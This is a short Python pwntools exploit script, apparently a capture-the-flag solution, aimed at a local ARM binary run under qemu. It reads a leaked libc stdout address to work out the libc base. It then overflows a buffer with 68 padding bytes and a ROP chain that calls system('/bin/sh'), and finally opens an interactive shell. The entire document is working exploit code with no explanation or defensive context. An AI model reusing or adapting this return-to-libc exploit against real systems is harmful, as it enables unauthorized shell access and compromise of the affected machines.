from pwn import *
TIMEOUT = 5

context(os="linux",arch="arm",log_level="debug")
p = process(['qemu-arm', '-L', './', './pwn'])
#p = remote("127.0.0.1",9999)


elf = ELF("./pwn")
libc=ELF("./libc.so.6")
rop=ROP(elf)

p.recvuntil(b"stream: ",timeout=TIMEOUT)
leak=p.recvline(timeout=TIMEOUT)
leak_addr=int(leak.strip(),16)
libc.address=leak_addr-libc.symbols["_IO_2_1_stdout_"]
#print(libc.address)
system_addr = libc.symbols["system"]

binsh_addr=next(libc.search(b"/bin/sh"))
pop_r0_r1_pc = (0x843b8+ libc.address)

payload=b"\0"*68+p32(pop_r0_r1_pc)+p32(binsh_addr)+p32(binsh_addr)+p32(system_addr)

p.sendafter(b"message:",payload,timeout=TIMEOUT)
p.interactive()